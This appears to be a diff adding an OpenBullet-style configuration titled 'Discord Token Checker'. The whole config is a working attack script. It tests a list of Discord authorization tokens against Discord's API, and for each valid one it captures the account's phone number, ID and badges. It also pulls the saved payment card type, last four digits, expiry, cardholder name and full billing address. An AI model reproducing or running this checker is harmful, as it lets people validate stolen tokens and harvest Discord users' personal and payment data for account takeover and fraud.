@@ -1,0 +1,150 @@
+[SETTINGS]
+{
+  "Name": "Discord Token Checker",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2022-06-27T18:28:35.7378825+03:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "script",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION GetRandomUA -> VAR "ua" 
+
+REQUEST GET "https://discord.com/api/v9/users/@me" 
+  
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US" 
+  HEADER "authorization: <USER>" 
+  HEADER "content-type: application/json" 
+  HEADER "origin: https://discord.com" 
+  HEADER "referer: https://discord.com/channels/@me" 
+  HEADER "user-agent: <ua>" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "401: Unauthorized" 
+  KEYCHAIN Success OR 
+    KEY "username" 
+
+PARSE "<SOURCE>" JSON "username" -> VAR "u" 
+
+PARSE "<SOURCE>" JSON "discriminator" -> VAR "t" 
+
+FUNCTION Constant "<u>#<t>" -> CAP "Username" 
+
+PARSE "<SOURCE>" JSON "id" CreateEmpty=FALSE -> CAP "ID" 
+
+PARSE "<SOURCE>" JSON "verified" CreateEmpty=FALSE -> CAP "Email Verified" 
+
+PARSE "<SOURCE>" JSON "phone" CreateEmpty=FALSE -> CAP "Phone Number" 
+
+PARSE "<SOURCE>" JSON "premium_type" -> VAR "pr" 
+
+PARSE "<SOURCE>" JSON "flags" -> VAR "fl" 
+
+FUNCTION Translate 
+  KEY "0" VALUE "None" 
+  KEY "1" VALUE "Nitro Classic" 
+  KEY "2" VALUE "Nitro Boost" 
+  "<pr>" -> CAP "Subscription" 
+
+FUNCTION Translate 
+  KEY "0" VALUE "None" 
+  KEY "1" VALUE "Discord Employee" 
+  KEY "2" VALUE "Discord Partner" 
+  KEY "4" VALUE "HypeSquad Events Member" 
+  KEY "8" VALUE "Bug Hunter" 
+  KEY "16" VALUE "SMS 2FA" 
+  KEY "32" VALUE "Discord Nitro Promotion Dismissed" 
+  KEY "64" VALUE "HypeSquad Bravery" 
+  KEY "128" VALUE "HypeSquad Brilliance" 
+  KEY "256" VALUE "HypeSquad Balance" 
+  KEY "512" VALUE "Early Supporter" 
+  KEY "1024" VALUE "Team Account" 
+  KEY "2048" VALUE "Partner/Verification Application" 
+  KEY "4096" VALUE "Discord System Account" 
+  KEY "8192" VALUE "Unread Messages from Discord" 
+  KEY "16384" VALUE "Gold Bug Hunter Badge" 
+  KEY "32768" VALUE "Account deleted for being underage." 
+  KEY "65536" VALUE "Verified Bot" 
+  KEY "131072" VALUE "Verified Bot Developer" 
+  KEY "262144" VALUE "Discord Certified Moderator" 
+  KEY "524288" VALUE "Bot with HTTP Interaction" 
+  KEY "1048576" VALUE "Spammer User" 
+  KEY "274877906944" VALUE "Selfbot User" 
+  KEY "2199023255552" VALUE "Disabled User" 
+  "<fl>" -> CAP "Flags" 
+
+REQUEST GET "https://discord.com/api/v9/users/@me/billing/payment-sources" 
+  
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US" 
+  HEADER "authorization: <USER>" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: <ua>" 
+  HEADER "x-debug-options: bugReporterEnabled" 
+  HEADER "x-discord-locale: en-US" 
+
+IF "<SOURCE>" Contains "brand"
+
+PARSE "<SOURCE>" JSON "brand" Recursive=TRUE CreateEmpty=FALSE -> CAP "Card Type" 
+
+PARSE "<SOURCE>" JSON "expires_month" Recursive=TRUE CreateEmpty=FALSE -> CAP "Expiration Month" 
+
+PARSE "<SOURCE>" JSON "expires_year" Recursive=TRUE CreateEmpty=FALSE -> CAP "Expiration Year" 
+
+PARSE "<SOURCE>" JSON "last_4" Recursive=TRUE CreateEmpty=FALSE -> CAP "Last 4" 
+
+PARSE "<SOURCE>" JSON "name" Recursive=TRUE CreateEmpty=FALSE -> CAP "Card Name" 
+
+PARSE "<SOURCE>" JSON "country" Recursive=TRUE CreateEmpty=FALSE -> CAP "Card Country" 
+
+PARSE "<SOURCE>" JSON "line_1" Recursive=TRUE -> VAR "addy1" 
+
+PARSE "<SOURCE>" JSON "city" Recursive=TRUE -> VAR "city" 
+
+PARSE "<SOURCE>" JSON "state" Recursive=TRUE -> VAR "state" 
+
+PARSE "<SOURCE>" JSON "country" Recursive=TRUE -> VAR "countr" 
+
+PARSE "<SOURCE>" JSON "postal_code" Recursive=TRUE -> VAR "postal" 
+
+FUNCTION Constant "Address: <addy1> | City: <city> | State: <state> | Postal Code: <postal> | Country: <countr>" -> CAP "Billing Address" 
+
+ELSE
+
+FUNCTION Constant "Address: None | City: None | State: None | Postal Code: None | Country: None" -> CAP "Billing Address" 
+
+ENDIF
+
